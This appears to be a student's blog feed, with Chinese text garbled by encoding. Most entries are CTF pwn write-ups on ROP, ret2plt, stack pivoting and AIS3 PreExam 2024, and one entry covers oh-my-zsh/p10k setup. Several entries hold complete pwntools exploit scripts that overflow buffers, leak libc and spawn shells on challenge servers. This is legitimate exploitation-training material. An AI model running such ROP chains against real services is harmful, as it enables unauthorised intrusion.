class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;/root/pwn/ctf/libc.so.6&quot;</span>)</span><br><span class="line">r= remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10010</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow with 0x28</span></span><br><span class="line">pop_rdi = <span class="number">0x401463</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">puts_plt = <span class="number">0x4010a0</span></span><br><span class="line">main = <span class="number">0x4011f6</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">leave_ret = <span class="number">0x4013f1</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    print_got,</span><br><span class="line">    puts_plt,</span><br><span class="line">    ret,</span><br><span class="line">    main</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Exit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;go!\n&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x80e50</span></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>))))</span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span>, pop_rdi, <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)), ret, l.sym.system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Exit\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;go!\n&#x27;</span>,p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oh-my-zsh p10k</title>
      <link href="/2024/08/11/oh-my-zsh/"/>
      <url>/2024/08/11/oh-my-zsh/</url>
      
        <content type="html"><![CDATA[<h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><p>oh-my-zsh å°±æ˜¯ä¸€å€‹å¯ä»¥è®“ä½ çš„ Zsh è®Šå¥½çœ‹çš„æ±æ±ï¼Œp10k æ˜¯ä»–çš„ä¸€å€‹ Theme<br>é€™ç¯‡æ–‡ç« ä¸»è¦è¬›æˆ‘ä»¥ç‚ºè£å®Œ oh-my-zsh å¾ŒæŠŠ python-env æçˆ›ï¼Œç„¶å¾Œæ‰¾æ–¹æ³•è®Šå›ä¾†çš„éç¨‹ã€‚</p><p>é¦–å…ˆçœ‹äº†<a class="link"   href="https://stackoverflow.com/questions/38928717/virtualenv-name-not-show-in-zsh-prompt" >é€™ç¯‡ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œ</p><p>è©¦äº†ä¸€ä¸‹é‡æ–° <code>python -m venv .venv</code> å°±å¯ä»¥äº†ï¼Œä½†é‚„æ˜¯æ²’æœ‰ <code>(.venv)</code> çš„prompt</p><p>googleä¸€ä¸‹ï¼Œæ‡‰è©²è·Ÿé€™å€‹è³‡æ–™å¤¾æœ‰é—œ <code>.oh-my-zsh/plugins/virtualenv</code>ï¼Œè¨»è§£æ‰è£¡é¢çš„ <code>export VIRTUAL_ENV_DISABLE_PROMPT=1</code></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.zshrc </span><br><span class="line">plugins=(virtualenv)</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></div><p>é‚„æ˜¯æ²’ç”¨ï¼Œä½†è¼¸å…¥ <code>virtualenv_prompt_info</code> æœƒè·³å‡º <code>[.venv]</code> æ‰€ä»¥é–‹å§‹æ‰¾æŠŠé€™å€‹å‡½æ•¸åµŒå…¥promptçš„æ–¹æ³•</p><p>ç„¶å¾Œç™¼ç¾æ˜¯æˆ‘pluginså¯«éŒ¯äº† æ­£ç¢ºå¯«æ³•æ˜¯<code>plugins = (git virtualenv)</code> æŠŠå…©å€‹å„å¯«ä¸€å€‹pluginsï¼Œç„¶å¾Œå°±è®Šæˆé€™æ¨£äº†</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/zsh-bug-1.png"                      alt="image"                ></p><p>æœ‰é»ç ´çˆ›å•Š (<del>å¾Œä¾†ç™¼ç¾æ˜¯æŠŠ .bashrc çš„ Theme æ”¹å£äº†</del>)</p><h2 id="ä¿®æ”¹-p10k-zsh"><a href="#ä¿®æ”¹-p10k-zsh" class="headerlink" title="ä¿®æ”¹ .p10k.zsh"></a>ä¿®æ”¹ .p10k.zsh</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">typeset</span> -g POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(</span><br><span class="line">  <span class="comment"># =========================[ Line #1 ]=========================</span></span><br><span class="line">  os_icon               <span class="comment"># os identifier</span></span><br><span class="line">  <span class="built_in">dir</span>                     <span class="comment"># current directory</span></span><br><span class="line">  vcs                     <span class="comment"># git status</span></span><br><span class="line">  <span class="comment"># =========================[ Line #2 ]=========================</span></span><br><span class="line">  newline                 <span class="comment"># \n</span></span><br><span class="line">  <span class="comment"># prompt_char           # prompt symbol</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œç™¼ç¾æœ¬ä¾†å°±æœ‰pyenvçš„è³‡è¨Šäº†ï¼Œå°±å¯«åœ¨å¾Œé¢çš„å°æ¡†æ¡† :&gt;<br>ç™¼ç¾æ™‚é–“ 4:00 AMï¼Œæœ‰æ™‚å€™éƒ½è¦ºå¾—æˆ‘æ ¹æœ¬æ²’è…¦</p><p>ä¸‰å°æ™‚å­¸æœƒæ”¹zsh :&gt;&gt;&gt;</p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p>zsh p10kå¯ä»¥çœ‹<a class="link"   href="https://onejar99.com/zsh-powerlevel10k-custom-config-note/" >é€™ç¯‡ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> zsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AIS3 PreExam2024</title>
      <link href="/2024/08/10/AIS3-PreExam2024/"/>
      <url>/2024/08/10/AIS3-PreExam2024/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç¸½å…±è§£å‡º5é¡Œ ,167th</p></blockquote><h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HykIbBeV0.png"                      alt="image"                ></p><h2 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h2><blockquote><p>è¼¸å…¥ 00 æœƒè·³é<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1PFWBxVC.png"                      alt="image"                ><br>å°±å¯ä»¥æ‹¿èµ°æœ€å¾Œä¸€é¡†</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/rJ2o-BgNA.png"                      alt="image"                ></p><h2 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1xOupgNR.png"                      alt="image"                ></p><p>flag: <code>AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</code></p><h2 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h2><blockquote><p>æŠŠsleep timeæ”¹çŸ­ä¸€é» ,ä½†ä¸èƒ½æ˜¯0</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1bN32gN0.png"                      alt="image"                ></p><blockquote><p>flagå°å®Œå°±æ¶ˆå¤±ã„Œ<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJtmeTx4R.png"                      alt="image"                ></p></blockquote><p>flag: AIS3{You_are_the_master_of_time_management!!!!?}</p><h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h2><blockquote><p>é€šéˆé¡Œ</p></blockquote><ul><li>æŠŠå°åŒ…<code>G-Code</code>çš„éƒ¨åˆ†æˆªä¸‹ä¾†ç”¨ç·šä¸Šç·¨è¼¯å™¨çœ‹<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ByJ3u0xVC.png"                      alt="image"                ></li></ul><h2 id="mathter"><a href="#mathter" class="headerlink" title="mathter"></a>mathter</h2><ul><li>æ²’è§£å‡ºä¾†</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">50001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;y&#x27;</span>*<span class="number">12</span>+ p64(<span class="number">0x40199b</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">889275714</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;]&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H1pPLbz4C.png"                      alt="image"                ></p>]]></content>
      
      
      
        <tags>
            
            <tag> ais3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP3-WriteUp</title>
      <link href="/2024/08/09/pwn-6/"/>
      <url>/2024/08/09/pwn-6/</url>
      
        <content type="html"><![CDATA[<h2 id="Ret2plt"><a href="#Ret2plt" class="headerlink" title="Ret2plt"></a>Ret2plt</h2><blockquote><p>é€™é¡Œè·Ÿä¸Šé¡Œå°±å·®åœ¨é€™é¡Œæ˜¯dynamic linkingï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦leak libcä½ç½®å¾Œä½¿ç”¨libcä¸­çš„æ±è¥¿call shellã€‚</p></blockquote><ul><li>printçš„gotå¡å…¥rdiå¾Œcall print@plté€™æ¨£æˆ‘å€‘å°±çŸ¥é“print functionåœ¨é€™æ¬¡ç¨‹å¼åŸ·è¡Œæ™‚æ˜¯åœ¨alsrçš„å“ªå€‹ä½ç½®</li><li>ç„¶å¾Œå†ç”¨ <code>readelf -s</code> æ‰¾å‡ºä¸¦å‰ªæ‰printfåœ¨libcä¸­çš„offsetï¼Œé€™æ¨£æˆ‘å€‘å°±å¾—åˆ°libcçš„base address</li><li>å†callå›main overflowåŸ·è¡Œæˆ‘å€‘çš„rop chainå°±å¯ä»¥æ‹¿åˆ°shelläº†ğŸ¥³</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>,<span class="number">10103</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop3&quot;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011f9</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">plt_print = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">name_buf = <span class="number">0x404060</span></span><br><span class="line">mainn= <span class="number">0x4011fe</span></span><br><span class="line">leave_ret = <span class="number">0x4011ef</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">p1 +=p64(ret)</span><br><span class="line">p1 += p64(pop_rdi)+p64(print_got)+p64(plt_print)</span><br><span class="line">p1 += p64(ret) + p64(mainn)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line">success (<span class="string">&#x27;libc -&gt; %s&#x27;</span> % <span class="built_in">hex</span>( l.address )) </span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>)),</span><br><span class="line">    ret,</span><br><span class="line">    l.sym.system</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/`whoami`/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Pivoting WriteUp</title>
      <link href="/2024/08/09/pwn-5/"/>
      <url>/2024/08/09/pwn-5/</url>
      
        <content type="html"><![CDATA[<h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><blockquote><p>å‰è¨€:åœ¨æ§åˆ¶ripå¾Œæ²’æœ‰è¶³å¤ çš„stackç©ºé–“è®“æˆ‘å€‘æ¨rop chainé€™æ™‚å°±éœ€è¦stack pivotingæŠ€è¡“</p></blockquote><p>è“‹åˆ°bufçµæŸå¾Œï¼Œå¡å…¥<code>leave;ret;</code>gadgetï¼Œè®“rbpè·³åˆ°æˆ‘å€‘æŒ‡å®šçš„stackä½ç½®ï¼Œç„¶å¾Œå°±æœƒå‡ºç¾<strong>é­”è¡“å¤§ç©ºé–“</strong></p><p>åœ–ç‰‡ä¾†è‡ªLYSæŠ•å½±ç‰‡<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pwn-1.png"                      alt="Alt text"                ></p><h2 id="Ais3-lys-rop1"><a href="#Ais3-lys-rop1" class="headerlink" title="Ais3-lys-rop1"></a>Ais3-lys-rop1</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;35.229.243.81&quot; ,10102)</span></span><br><span class="line">r = process(<span class="string">&#x27;../lab_rop2/rop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rsi =<span class="number">0x0000000000409f7e</span></span><br><span class="line">buf = <span class="number">0x4c7300</span></span><br><span class="line">syscall = <span class="number">0x0000000000401d04</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4017ee</span></span><br><span class="line"></span><br><span class="line">chain = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">chain += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">chain += p64(pop_rsi) + p64(<span class="number">0x0</span>)</span><br><span class="line">chain += p64(pop_rdi) + p64(buf)</span><br><span class="line">chain += p64(pop_rdx_rbx) + p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">chain += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">p1 += p64(buf)</span><br><span class="line">p1 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name? &#x27;</span>,chain)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln: &#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="ncku-ctf-pivoting"><a href="#ncku-ctf-pivoting" class="headerlink" title="ncku-ctf-pivoting"></a>ncku-ctf-pivoting</h2><p>é€™é‚Šä¸Šä¸‹å…©é¡Œå¹¾ä¹ä¸€æ¨£åªæœ‰gadgetéœ€è¦é‡æ‰¾</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./chal&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401f1f</span></span><br><span class="line">pop_rax = <span class="number">0x44ff47</span></span><br><span class="line">pop_rsi = <span class="number">0x409f8e</span> </span><br><span class="line">pop_rdx_rbx = <span class="number">0x485ccb</span> </span><br><span class="line">syscall = <span class="number">0x401cd4</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x4c7220</span></span><br><span class="line">leave_ret = <span class="number">0x401877</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    name,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pri = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    name,</span><br><span class="line">    leave_ret,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,pri)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP WriteUp</title>
      <link href="/2024/08/09/pwn-4/"/>
      <url>/2024/08/09/pwn-4/</url>
      
        <content type="html"><![CDATA[<h3 id="Ais3-lys-rop1"><a href="#Ais3-lys-rop1" class="headerlink" title="Ais3-lys-rop1"></a>Ais3-lys-rop1</h3><blockquote><p>ç•¶æœ‰NXä¿è­·æ©Ÿåˆ¶æ™‚ï¼ŒROPå¯ä»¥å¹«åŠ©æˆ‘å€‘ç¹éä»–</p></blockquote><p>æ‰¾gadgetæŠŠrop chainæ¨æˆshellcodeçš„å½¢ç‹€</p><br><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span> ,<span class="number">10101</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop1&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name?&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">syscall  =<span class="number">0x0000000000401d04</span></span><br><span class="line">a_buf = <span class="number">0x4c7300</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rax)+p64(59)</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rsi)+p64(0x0)</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rdi) + p64(a_buf)</span></span><br><span class="line"><span class="comment"># p += p64(pop_rdx_rbx)+p64(0x0)+p64(0x0)</span></span><br><span class="line"><span class="comment"># p += p64(syscall)</span></span><br><span class="line"></span><br><span class="line">p +=flat(</span><br><span class="line">    p64(pop_rax), p64(<span class="number">59</span>),</span><br><span class="line">    p64(pop_rsi) , p64(<span class="number">0x0</span>),</span><br><span class="line">    p64(pop_rdi) , p64(a_buf),</span><br><span class="line">    p64(pop_rdx_rbx),p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>),</span><br><span class="line">    p64(syscall)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;vuln:&quot;</span>,p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="ncku-ctf-ezrop"><a href="#ncku-ctf-ezrop" class="headerlink" title="ncku-ctf-ezrop"></a>ncku-ctf-ezrop</h2><p>é€™é¡Œè·Ÿä¸Šé¢å·®åœ¨éœ€è¦æ‰¾åˆ°ä¸€å€‹ä½ç½®å¯«å…¥<code>/bin/sh</code>åœ¨æŠŠrdiæŒ‡éå»ï¼Œåƒä¸Šé¢æˆ‘å€‘æŠŠrdiæŒ‡å‘nameçš„memory addressã€‚<br>é€™é‚Šæˆ‘å€‘åˆ©ç”¨ 